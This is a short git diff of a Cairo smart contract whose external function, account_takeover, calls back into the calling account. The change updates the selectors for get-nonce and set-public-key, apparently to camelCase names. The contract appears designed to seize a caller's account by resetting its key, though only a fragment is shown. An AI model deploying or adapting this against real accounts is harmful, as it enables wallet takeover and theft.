@@ -7,9 +7,9 @@ from starkware.cairo.common.cairo_builtins import HashBuiltin, SignatureBuiltin
 
 from starkware.cairo.common.alloc import alloc
 
-const GET_NONCE = 756703644403488948674317127005533987569832834207225504298785384568821383277
+const GET_NONCE = 552903089969425767928229549651117769995883180701982662494390259046237820117
 const EXECUTE = 617075754465154585683856897856256838130216341506379215893724690153393808813
-const SET_PUBLIC_KEY = 1307260637166823203998179679098545329314629630090003875272134084395659334905
+const SET_PUBLIC_KEY = 332268845949430430346835224631316185987738351560356300584998172574125127129
 
 @external
 func account_takeover{
@@ -23,7 +23,7 @@ func account_takeover{
     let (empty_calldata: felt*) = alloc()
     let res = call_contract(
         contract_address=caller,
-        function_selector=GET_NONCE, # get_nonce
+        function_selector=GET_NONCE, # getNonce
         calldata_size=0,
         calldata=empty_calldata,
     )
